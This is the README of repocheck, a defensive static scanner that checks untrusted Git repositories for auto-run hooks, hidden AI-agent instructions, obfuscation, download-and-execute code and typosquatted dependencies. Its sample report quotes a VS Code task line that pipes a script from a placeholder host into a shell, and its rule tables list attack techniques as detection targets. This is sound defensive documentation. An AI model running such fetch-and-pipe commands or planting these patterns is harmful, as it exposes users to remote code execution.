# repocheck

repocheck statically checks an untrusted Git repository **before** you run, install,
build or open anything from it, and never executes code from it.

It is built around three questions:

| Category   | Question                                                                    |
|------------|-----------------------------------------------------------------------------|
| danger     | Does anything run automatically, or is something hidden, obfuscated or injected? |
| trust      | How do the owner, stars, contributors and maintenance look? *(planned)*     |
| provenance | What is the repository made of, and how did it come about?                  |

The result is a list of findings plus an honest list of what was **not** checked.
repocheck never says that a repository is safe.

## Status

Early (version 0.1.0, milestones M1 to M3 of 5 done). What works today:

- **Local folders and public GitHub repositories.** A URL like
  `https://github.com/<owner>/<repo>` is fetched into a temporary folder as Git objects
  only (no checkout, nothing from the repository is written under its own file name)
  and deleted after the scan.
- **Reports** for the terminal, as JSON (`docs/report.schema.json`) or as SARIF 2.1.0
  for code-scanning tools.
- **Provenance profile** (facts, not findings): languages, size, largest files,
  top-level structure, usual project files that are present or missing, share of
  generated or vendored files, license (file text and manifest) and notable files such
  as AI agent configuration, dev containers or editor settings. With Git history (a URL
  target, or a local folder with a `.git` folder): commits, time span, authors and
  e-mail domains, signed commits, the share of files that arrived in the first commit
  and AI tools named in commit messages.
- **Provenance indicators** (`info`/`low`, rules `RC-PROV-*`): one large initial commit,
  commit dates in the future or edited, a history rewritten or created in one go, AI
  tool trailers, "generated with" notes and committed AI session histories. They are
  hints about how a repository came about, never a verdict: commit dates and authors
  can be set by anyone.
- **Danger, six areas:** auto-run code (`autorun`), AI agent instructions and
  configuration (`agents`), obfuscated code (`obfuscation`), download-and-execute
  (`download_exec`), binaries and file-system tricks (`binaries`) and suspicious
  dependencies (`dependencies`); see the rule table below.
- Developed and tested on Windows 11. The code is platform-neutral, but macOS and Linux
  are not tested yet.

## Installation

repocheck is not on PyPI yet. Install from source with [uv](https://docs.astral.sh/uv/)
(Python 3.12 or newer; uv downloads a matching Python if needed):

```
git clone <repository URL> repocheck
cd repocheck
uv sync
uv run repocheck --version
```

`uv sync` installs the exact versions pinned in `uv.lock`. Runtime dependencies are
PyYAML and [dulwich](https://www.dulwich.io/) (pure-Python Git, which brings urllib3).

## Usage

```
uv run repocheck scan PATH|URL [options]
```

Examples:

```
# Check a folder you downloaded or cloned
uv run repocheck scan D:\downloads\some-repo

# Check a public GitHub repository without cloning it yourself (default branch)
uv run repocheck scan https://github.com/pallets/flask

# A branch, a tag or a full commit id; keep the temporary Git objects for a look
uv run repocheck scan https://github.com/pallets/flask --ref 3.1.0
uv run repocheck scan https://github.com/pallets/flask --ref <40-character commit id> --keep-clone

# Plain output without colors (also set by the NO_COLOR environment variable)
uv run repocheck scan ./some-repo --no-color

# Only show high and critical findings
uv run repocheck scan ./some-repo --min-severity high

# Exit with 1 already on medium findings (default threshold: high)
uv run repocheck scan ./some-repo --fail-on medium

# Also check .venv, venv, node_modules, .tox, .nox and tool caches (skipped by default)
uv run repocheck scan ./some-repo --include-env-dirs

# JSON report to stdout, SARIF report into a file (never inside the checked folder)
uv run repocheck scan ./some-repo --format json
uv run repocheck scan ./some-repo --format sarif -o repocheck.sarif

# Skip one rule, check larger files, add your own rules folder
uv run repocheck scan ./some-repo --ignore-rule RC-AGENT-001 --max-file-size 8MB --rules ./my-rules

# List the rules, optionally for one area
uv run repocheck rules list
uv run repocheck rules list --area agents
```

All `scan` options:

| Option                  | Meaning                                                              |
|-------------------------|----------------------------------------------------------------------|
| `--min-severity LEVEL`  | Hide findings below `info`, `low`, `medium`, `high` or `critical` (default: `info`). |
| `--fail-on LEVEL`       | Exit with 1 if a finding has at least this level (default: `high`).  |
| `--ignore-rule ID`      | Do not run this rule (repeatable).                                   |
| `--rules DIR`           | Load additional rules from this folder (repeatable).                 |
| `--max-file-size SIZE`  | Largest file whose content is checked (default: `2MB`).              |
| `--include-env-dirs`    | Also check environment and tool cache folders.                       |
| `--ref REF`             | URL targets: branch, tag or full commit id (default: the default branch). |
| `--keep-clone`          | URL targets: keep the temporary folder with the fetched Git objects; its path is printed. |
| `--max-clone-size SIZE` | URL targets: abort if the download is larger (default: `500MB`).    |
| `--clone-timeout SECONDS` | URL targets: abort the download after this time (default: `300`). |
| `--format FORMAT`       | `text` (default), `json` or `sarif`.                                 |
| `-o`, `--output FILE`   | Write the report to FILE instead of stdout. FILE must be outside the checked folder. |
| `--no-color`            | Plain output without colors.                                         |
| `--offline`             | No GitHub API queries. Accepted already; today every scan is offline (a URL target is still downloaded). |
| `-v`, `--verbose`       | More detail.                                                         |

Rule suppressions and other configuration are only taken from the command line, never
from the checked repository (that content is controlled by whoever wrote the repository).

## Sample output

An excerpt from a real scan of a small test folder (path shortened, the URLs are
placeholders):

```
repocheck 0.1.0 | local folder D:\src\demo | offline | 5 files | 101 rules
Lines starting with '>' are untrusted content quoted from the repository.

DANGER                                   1 critical | 2 high
  CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                  confidence high
            Task starts on folder open and fetches or runs code: curl -s
            https://example.invalid/i.sh | sh
            > "command": "curl -s https://example.invalid/i.sh | sh",
            Why  This task starts as soon as the folder is opened in a trusted
                 workspace, and it downloads code, pipes into an interpreter or
                 decodes a payload.
            Do   Do not trust this folder in VS Code. Open it in Restricted
                 Mode or another editor and remove the task before working with
                 it.

  HIGH      RC-DEP-001    requirements.txt:2                  confidence medium
            'reqeusts' looks like the popular package 'requests' (rank 7)
            > reqeusts>=2.31
  ...

NOT CHECKED
  - trust (GitHub API): not implemented yet (milestone 4)
  - Environment and tool cache folders (.venv, venv, node_modules, .tox, .nox, .mypy_cache, .ruff_cache, .pytest_cache) skipped; use --include-env-dirs to check them (1): node_modules
  - No .git folder; the Git history was not checked
  - Dependencies are checked by name and declared source only; their code and install scripts are not checked (no registry queries) (2): package.json, requirements.txt

repocheck reports only what its 101 rules detect in the checked scope.
A missing finding is not proof that the repository is safe.
```

Each finding has a rule ID, severity, confidence, file and line (where it applies), the
reason (`Why`) and a recommendation (`Do`). Text quoted from the repository is masked
before output: control characters and invisible Unicode characters are shown as
`<U+XXXX>`, so they cannot change your terminal or mislead a reader.

On a terminal with UTF-8 output, `|` in the header is shown as `·`.

Before "Not checked", the report shows the provenance profile. It describes the
repository; it is not a finding and not a quality score (same demo folder):

```
PROVENANCE PROFILE                       facts, not findings
  Files      5 files, 366 bytes; 5 text files with 20 lines, 0 binary
  Languages  TypeScript 100% (1 file)
  Data, docs JSON (2), Text (1), Markdown (1)
  Largest    .vscode/tasks.json (207 bytes), package.json (64 bytes),
             src/index.ts (47 bytes)
  Top level  .vscode/, src/, package.json, README.md, requirements.txt
  Present    readme
  Missing    license, tests, CI, docs, changelog, contributing guide, security
             policy, code of conduct, code owners, dependency update bot
  License    no license file found; declared MIT (package.json)
  Notable    editor and IDE settings (1): .vscode/tasks.json
             package manifests (2): package.json, requirements.txt
```

## JSON and SARIF

- **JSON** (`--format json`): tool, target, scan data, a summary per severity and
  category, the findings, the coverage gaps ("Not checked"), facts (`source` for URL
  targets, `provenance` profile) and the disclaimer. The structure is described in
  [docs/report.schema.json](docs/report.schema.json) (`schema_version` 1.1).
- **SARIF 2.1.0** (`--format sarif`) for GitHub code scanning and SARIF viewers: every
  rule with title, reason, recommendation and `security-severity`; `critical`/`high`
  findings have level `error`, `medium` `warning`, `low`/`info` `note`. Paths are
  relative to `SRCROOT` (the checked folder). Coverage gaps appear as tool execution
  notifications. Findings that concern a whole file point to line 1. The provenance
  profile is in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub
  URL of the checked commit.

Both formats contain only ASCII: text from the repository is sanitized like in the
terminal report, and file paths in SARIF are percent-encoded. `--min-severity` filters
both; the exit code never depends on the format.

## What is checked

Severity says how bad it is if the finding means what the rule claims; confidence says
how likely that is. `critical` and `high` mean code runs automatically during normal use
(install, build, opening the folder, starting an agent) or something is clearly
disguised.

The table below is generated from the YAML rules in `src/repocheck/rules/` with
`uv run repocheck rules list --markdown`; a test fails if it is out of date.

<!-- rules-table:start -->
#### Auto-run code (`autorun`, 33 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-AUTO-001 | medium | npm install lifecycle script present |
| RC-AUTO-002 | low | npm prepare or prepack script present |
| RC-AUTO-003 | high | npm lifecycle script downloads or executes code |
| RC-AUTO-004 | medium | Yarn runs JavaScript from the repository (yarnPath or plugins) |
| RC-AUTO-005 | high | npm configuration runs a custom shell or preloads code |
| RC-AUTO-006 | high | pnpm hook file (.pnpmfile.cjs) |
| RC-AUTO-010 | low | setup.py present |
| RC-AUTO-011 | high | setup.py starts processes, uses the network, runs or decodes code |
| RC-AUTO-012 | medium | setup.py overrides setup commands (cmdclass) |
| RC-AUTO-013 | medium | Unknown Python build backend |
| RC-AUTO-014 | high | Python build backend loaded from the repository (backend-path) |
| RC-AUTO-015 | medium | Custom build hooks in pyproject.toml |
| RC-AUTO-016 | high | .pth file with code |
| RC-AUTO-017 | high | sitecustomize.py or usercustomize.py in the repository |
| RC-AUTO-020 | high | VS Code task runs when the folder is opened |
| RC-AUTO-021 | critical | VS Code task that runs on folder open downloads or executes code |
| RC-AUTO-022 | high | VS Code settings point an interpreter, tool or shell into the repository |
| RC-AUTO-025 | high | Dev container runs initializeCommand on the host |
| RC-AUTO-026 | low | Dev container lifecycle commands |
| RC-AUTO-030 | high | Active Git hook in the repository |
| RC-AUTO-031 | high | Git config runs commands |
| RC-AUTO-032 | critical | Git config sets core.fsmonitor to a command |
| RC-AUTO-033 | low | .gitattributes assigns a custom filter, diff or merge driver |
| RC-AUTO-040 | high | Makefile or justfile downloads and runs code |
| RC-AUTO-041 | medium | direnv file (.envrc) |
| RC-AUTO-042 | medium | mise hooks or sourced scripts |
| RC-AUTO-050 | high | Windows shell file points to a remote location |
| RC-AUTO-051 | medium | Windows shortcut in the repository |
| RC-AUTO-060 | medium | GitHub workflow runs pull request code with pull_request_target |
| RC-AUTO-061 | medium | GitHub workflow runs an encoded command |
| RC-AUTO-070 | medium | MSBuild project runs a command on build |
| RC-AUTO-071 | high | MSBuild project downloads or decodes code during the build |
| RC-AUTO-072 | high | MSBuild inline task with code |

#### AI agent instructions and configuration (`agents`, 26 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-AGENT-001 | info | AI agent file present |
| RC-AGENT-002 | critical | Hidden Unicode tag characters in an AI agent file |
| RC-AGENT-003 | high | Hidden Unicode tag characters in a text file |
| RC-AGENT-004 | high | Bidirectional control characters in an AI agent file |
| RC-AGENT-005 | medium | Zero-width characters in an AI agent file |
| RC-AGENT-006 | high | Run of Unicode variation selectors (hidden bytes) |
| RC-AGENT-010 | medium | HTML comment in an AI agent file |
| RC-AGENT-011 | medium | Hidden Markdown or HTML content in an AI agent file |
| RC-AGENT-012 | medium | Instructions for AI tools hidden in an HTML comment |
| RC-AGENT-020 | high | Instruction to override rules or hide actions from the user |
| RC-AGENT-021 | high | Agent instruction to download and run code |
| RC-AGENT-022 | medium | AI agent file refers to secrets or credentials |
| RC-AGENT-023 | high | Exfiltration target in an AI agent file |
| RC-AGENT-024 | high | Agent safety checks switched off |
| RC-AGENT-025 | high | Agent instruction loads further instructions from the web |
| RC-AGENT-026 | high | Agent file imports files from outside the repository |
| RC-AGENT-030 | high | Claude Code hooks in project settings |
| RC-AGENT-031 | high | Broad agent permissions in project settings |
| RC-AGENT-032 | critical | Claude Code API traffic redirected or API key helper set |
| RC-AGENT-033 | high | Claude Code settings run helper commands |
| RC-AGENT-034 | medium | Claude Code plugins or marketplaces in project settings |
| RC-AGENT-040 | medium | MCP server starts a local program |
| RC-AGENT-041 | high | MCP server runs a repository script, an unpinned package or a download |
| RC-AGENT-042 | low | MCP server at a remote URL |
| RC-AGENT-050 | medium | Slash command or skill runs shell commands |
| RC-AGENT-060 | high | Other AI agents set to run commands without asking |

#### Obfuscated code (`obfuscation`, 9 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-OBF-001 | medium | Long encoded blob in source code |
| RC-OBF-002 | high | Encoded blob in source code decodes to code or commands |
| RC-OBF-003 | high | Code is decoded and executed in one step |
| RC-OBF-004 | high | JavaScript obfuscator or packer output |
| RC-OBF-005 | high | String built from a long chain of character codes |
| RC-OBF-006 | medium | Very long line in source code |
| RC-OBF-007 | high | Code pushed out of view by a long run of spaces |
| RC-OBF-008 | high | Bidirectional control characters in source code (Trojan Source) |
| RC-OBF-009 | medium | Invisible characters in source code |

#### Download-and-execute (`download_exec`, 5 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-DLX-001 | medium | Script downloads code and pipes it into an interpreter |
| RC-DLX-002 | high | Windows system tool used to download or run remote code |
| RC-DLX-003 | high | Code from a web request is executed |
| RC-DLX-004 | high | Script downloads a file into a temporary folder and runs it |
| RC-DLX-005 | medium | Code contacts a webhook, tunnel, paste or file-sharing service or a raw IP |

#### Binaries, archives, file-system tricks (`binaries`, 13 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-BIN-001 | high | Executable program in the repository |
| RC-BIN-002 | critical | Executable disguised as a document, image or text file |
| RC-BIN-003 | critical | File name with a double extension |
| RC-BIN-004 | critical | Invisible or control characters in a file or folder name |
| RC-BIN-005 | medium | Compiled code that cannot be reviewed |
| RC-BIN-006 | low | Archive in the repository |
| RC-BIN-007 | medium | Password-protected archive |
| RC-BIN-008 | medium | Office document with macros |
| RC-BIN-009 | medium | File name that Windows reserves or cannot store |
| RC-BIN-010 | medium | Paths that differ only in upper and lower case |
| RC-BIN-011 | medium | Link that points outside the repository |
| RC-BIN-012 | high | Git submodule with a dangerous URL or path |
| RC-BIN-013 | medium | Python bytecode cache without its source file |

#### Suspicious dependencies (`dependencies`, 7 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-DEP-001 | high | Dependency name one typo away from a very popular package |
| RC-DEP-002 | medium | Dependency name one typo away from a popular package |
| RC-DEP-003 | medium | Long dependency name close to a very popular package |
| RC-DEP-010 | medium | Dependency installed from Git or a URL |
| RC-DEP-011 | high | Additional or replaced Python package index |
| RC-DEP-012 | high | npm or Yarn registry replaced |
| RC-DEP-013 | medium | Lockfile installs packages from outside the default registry |

#### Languages, structure, history (`provenance`, 8 rules)

| ID | Severity | Description |
|----|----------|-------------|
| RC-PROV-001 | info | Most files arrived in one initial commit |
| RC-PROV-002 | low | Commit dates in the future |
| RC-PROV-003 | low | Author dates later than commit dates |
| RC-PROV-004 | info | History committed in one go |
| RC-PROV-005 | info | Many commits authored within minutes |
| RC-PROV-010 | info | Commits name an AI tool as co-author or generator |
| RC-PROV-011 | info | Text says it was generated with an AI tool |
| RC-PROV-012 | info | AI coding session history committed |
<!-- rules-table:end -->

Rules are data, not code: each one is a YAML entry with an ID, severity, confidence,
file patterns, a check, and texts for message, reason and recommendation. Rule IDs are
never renamed or reused.

## Limits: what is not checked

**"No findings" does not mean "safe".** It only means that none of the rules matched
in the part of the repository that was checked. repocheck looks for known patterns with
few false alarms; an attacker who knows the rules can avoid them.

Not checked today:

- **Whole areas** (planned): trust via the GitHub API (milestone 4). The report lists
  it under "Not checked".
- **Provenance profile:** languages are recognized by file extension or name only, and
  licenses by distinctive phrases of common license texts; neither is a code or legal
  review. A local folder's `.git` folder is not part of the profile.
- **Git history** is read only from a URL clone or a local `.git` folder that has no
  links, no alternates and no `commondir` (otherwise it is listed under "Not checked");
  at most 100,000 commits. Commit dates, authors and trailers are free text chosen by
  whoever commits, so all history facts are indicators. AI indicators only show that a
  tool was named, not who or what wrote the code. SHA-256 repositories and reftable
  refs are not supported.
- **Dependencies** are checked by name and declared source only, offline: names are
  compared with lists of the most downloaded PyPI and npm packages shipped with
  repocheck (see `src/repocheck/data/SOURCES.md`). The code and install scripts of
  dependencies, known vulnerabilities and transitive dependencies are not checked;
  Rust, Go, Ruby, PHP and Java dependencies are not checked at all.
- **Binary files** are recognized by their signature only: archives are not unpacked,
  programs and documents are not analyzed. Content of Git submodules and Git LFS
  objects is not checked; both are listed under "Not checked".
- **Obfuscation and download-and-execute** are only checked in source and script files
  (not in Markdown, JSON or notebooks), not in test modules (`test_*.py`, `*.test.ts`,
  `testdata/`, `fixtures/`, ...) and, for the noisier rules, not in build output
  (`dist/`, `build/`, `*.min.js`, ...). Code in comment lines is ignored. Downloads
  that are split over several lines or files are not recognized.
- **Auto-run surfaces that are recognized but not analyzed:** Rust `build.rs`,
  Composer, Gradle and Maven, Ruby gemspecs and Rakefiles, `go:generate`, CMake,
  JetBrains `.idea/` settings. GitHub Actions workflows are only checked for
  `pull_request_target` checkouts and encoded commands, MSBuild files only for `Exec`,
  `DownloadFile` and inline tasks. If present, they are listed under "Not checked".
- **URL targets:** only public repositories on `https://github.com/<owner>/<repo>`;
  other hosts and SSH, `git://` or `file://` URLs are rejected. Git submodules are
  listed, never fetched. The default limits are 500 MB download and 300 seconds.
- **Skipped files:** files larger than `--max-file-size` (default 2 MB), environment and
  tool cache folders unless `--include-env-dirs` is given, symlinks and junctions (listed,
  never followed), files that cannot be read or parsed. All of them appear under
  "Not checked".
- **Line numbers** in JSON, TOML and YAML files are best effort.
- **Out of scope by design:** running, sandboxing or dynamic analysis of repository code;
  known vulnerabilities (CVE) in dependencies (use pip-audit, npm audit or OSV-Scanner);
  leaked secrets; antivirus signatures; a total score or a safe/unsafe verdict.

Read the "Not checked" section of every report. Gaps in coverage do not change the exit
code.

## Security model

- **Nothing from the checked repository is executed:** no scripts, hooks, builds, package
  managers or imports. Python files are only parsed with `ast.parse`; YAML is only read
  with a safe loader with size and alias limits. Ruff rules (`banned-api`,
  flake8-bandit) and a self-check test forbid `subprocess`, `os.system`, `eval`, `exec`,
  `pickle` and similar in repocheck's own code.
- **Offline analysis:** scanning a local folder makes no network connections. For a URL
  target, the only connection is the HTTPS download from github.com (TLS verified, no
  Git configuration, credential helpers or stored passwords are used). The test suite
  blocks sockets to make sure of that; the clone tests use a local Git server on
  127.0.0.1 only.
- **Read-only:** files are only opened for reading; nothing in the checked folder is
  changed. Symlinks, junctions and reparse points are not followed. Inside `.git/`, only
  `config`, `hooks/*` and `info/attributes` are read, as plain files.
- **No `git` binary:** repocheck never calls `git`, so Git configuration in the checked
  repository (for example `core.fsmonitor`, filters or pagers) can never run. GitHub
  URLs are fetched with [dulwich](https://www.dulwich.io/), a pure-Python Git
  implementation: only the pack file is downloaded into a fresh temporary folder (no
  working tree, refs, hooks, submodules, LFS or filters), and files are read from the
  Git objects in memory. Object sizes are checked before anything is unpacked, so a
  small download cannot inflate into gigabytes. The folder is deleted after the scan.

## Exit codes

The exit codes are a stable interface for scripts and CI:

| Code | Meaning                                                                         |
|------|---------------------------------------------------------------------------------|
| 0    | No findings at or above `--fail-on` (this does not mean the repository is safe) |
| 1    | At least one finding at or above `--fail-on`                                     |
| 2    | Usage error: invalid arguments, target not found, invalid rules file, unsupported URL |
| 3    | Analysis aborted: download failed or hit a limit, internal error, interruption   |

## Development

```
uv sync                      # create .venv with the pinned dev tools
uv run pytest                # all tests
uv run mypy                  # strict type check of src and tests
uv run ruff check            # lint, including security rules
uv run ruff format --check   # formatting
```

All four must pass before a change is done. `uv run pytest -m "not slow"` skips the
performance test (10,000 generated files).

Every rule has at least one positive and one harmless test case in
`tests/rule_cases/*.yaml`; a meta test fails otherwise. Test fixtures are written to a
temporary folder only during the test, and every regular expression is tested against
pathological inputs (ReDoS).

After changing rules, regenerate the table above with
`uv run repocheck rules list --markdown` and paste it between the
`rules-table` markers; `tests/test_readme.py` checks it.

**False-positive corpus:** `tests/corpus/corpus.yaml` lists real open-source repositories
pinned to a commit (each one can also be checked by URL, see the corpus README). `tests/test_corpus.py` scans each and fails on high or critical
findings that are not explicitly accepted. Tests never download anything, so the test is
skipped unless `REPOCHECK_CORPUS_DIR` points to the extracted repositories. See
[tests/corpus/README.md](tests/corpus/README.md) for downloading and running it:

```
# Bash
REPOCHECK_CORPUS_DIR=/path/to/corpus uv run pytest -m corpus

# PowerShell
$env:REPOCHECK_CORPUS_DIR = "C:\path\to\corpus"; uv run pytest -m corpus
```

## Roadmap

- **M2** *(done)*: JSON and SARIF output, the six danger areas, more auto-run
  surfaces (GitHub Actions, MSBuild, `.gitattributes`), eight-repository
  false-positive corpus.
- **M3** *(done)*: GitHub URLs via dulwich, provenance profile from files and Git
  history, provenance indicators (`RC-PROV`).
- **M4** *(planned)*: trust signals from the GitHub API (optional token from an
  environment variable, `--offline` turns it off).
- **M5** *(planned)*: macOS and Linux support with CI, platform-specific rules, more
  ecosystems, installation with `uv tool install`.

## License

TBD.
